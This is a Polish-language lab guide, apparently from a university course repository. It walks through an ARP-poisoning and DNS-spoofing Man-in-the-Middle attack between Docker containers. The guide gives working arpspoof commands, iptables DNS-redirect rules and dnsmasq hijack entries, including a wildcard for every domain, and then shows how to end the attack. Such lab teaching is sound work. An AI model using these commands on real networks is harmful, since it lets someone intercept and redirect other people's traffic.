# Wykorzystanie narzędzia Docker do zobrazowania ataku typu Man in the Middle (MitM)






## Laboratorium 02: Atak DNS Spoofing


### Pobieranie projektu

Polecenia:
```bash
git clone https://github.com/mateuszskala/BiNSC.git
cd BiNSC/Lab02
```

### Weryfkacja plików

* docker-compose.yml - plik definiujący kontenery scenariusza
* Dockerfile.attacker - plik definiujący obraz kontenera atakującego
* Dockerfile.client - plik definiujący obraz kontenera ofiary
* folder attacker_fles - pliki konfiguracyjne i skrypty dla kontenera atakującego
* 
### Uruchomienie środowiska i struktura sieci
Polecenia:
```bash
docker-compose build
docker-compose up -d
docker ps
```

W sieci znajdują się 2 kontenery oraz domyślna brama, mają przypisane
nasętpujące adresy IP:
* dns_attacker - 172.30.1.10
* dns_client - 172.30.1.5
* brama - 172.30.1.1

Otwieramy 2 okna terminala, w pierwszym łączymy się z kontenerem atakującym, w drugim z kontenerem ofiary:

```bash
docker exec -it dns_attacker bash
docker exec -it dns_client bash
```

### Weryfikacja komunikacji z siecią zewnętrzną

Na kontenerze ofiary sprawdzamy adresy MAC bramy i atakującego:

```bash
ping 172.30.1.10
ping 172.30.1.1
arp -a
```

Warto zanotować je do późniejszej weryfikacji. Następnie sprawdzamy czy
komunikacja z siecią zewnętrzną działa poprawnie:
```bash
ping wp.pl
ping allegro.pl
ping google.com
...
curl wp.pl -i
curl allegro.pl -i
curl google.com -i
```

Również warto zanotować adres IP domeny wp.pl oraz odpowiedź na zapytanie
http do późniejszej weryfikacji.

### ARP poisoning

Na kontenerze atakującym otwieramy nowe okna terminala i uruchamiamy w
nich narzędzie arpspoof, możemy w kolejnym oknie otworzyć również narzędzie
tshark do śledzenia przepływu pakietów:

```bash
arpspoof -t 172.30.1.5 172.30.1.1
arpspoof -t 172.30.1.1 172.30.1.5
tshark -i eth0 -Y "dns or tls or http"
```

Następnie na kontenerze ofiary znów sprawdzamy tablice ARP:
```bash
arp -a
```

Adres bramy powinien być teraz taki sam jak atakującego.

### Uruchomienie Dnsmasq

Na kontenerze atakującym dodajemy 2 reguły do iptables i uruchamiamy usługę
Dnsmasq:
```bash
iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j REDIRECT --to-port 53
service dnsmasq start
```

Na kontenerze ofiary sprawdzamy ponownie komunikacje z siecią zewnętrzną:
```bash
ping wp.pl
ping allegro.pl
ping google.com
...
curl wp.pl -i
curl allegro.pl -i
curl google.com -i
...
```

Adres IP domeny wp.pl powinien być teraz 172.30.1.10, a odpowiedź na
zapytanie http wyglądać mniej więcej tak:
```html
<html>
<body>
<h1>Witaj! Ta domena zostaªa przej¦ta.</h1>
</body>
</html>
```

Podczas setupu uruchamiany jest prosty skrypt responder.py, który nasłuchuje
na porcie 80 i zwraca powyższą stronę dla każdej przychodzącej prośby HTTP.

### Modyfikacja konfiguracji Dnsmasq

Plik konfiguracyjny dla Dnsmasq znajduje się w /etc/dnsmasq.conf. Możemy
zmodyfikować istniejące linie address lub dodać nową regułę. Na przykład:
```bash
address=/wp.pl/172.30.1.10 -> address=/google.com/172.30.1.10
address=/youtube.com/172.30.1.10
address=/#/172.30.1.10 #modyfikacja każdej domeny
```

Następnie restartujemy usługę Dnsmasq:
```bash
service dnsmasq restart
```

### Zakończenie ataku

Aby przerwać atak kończymy proces w oknie, w którym uruchomiono arpspoof
(CTRL+C). Oraz wpisujemy polecenie:
```bash
iptables -t nat -F PREROUTING
```

Nasętpnie na kontenerze ofiary ponownie sprawdzamy tablice ARP, adresy
MAC powinny być różne tak jak na początku:
```bash
arp -a
```

Również weryfikujemy adres IP atakowanej domeny.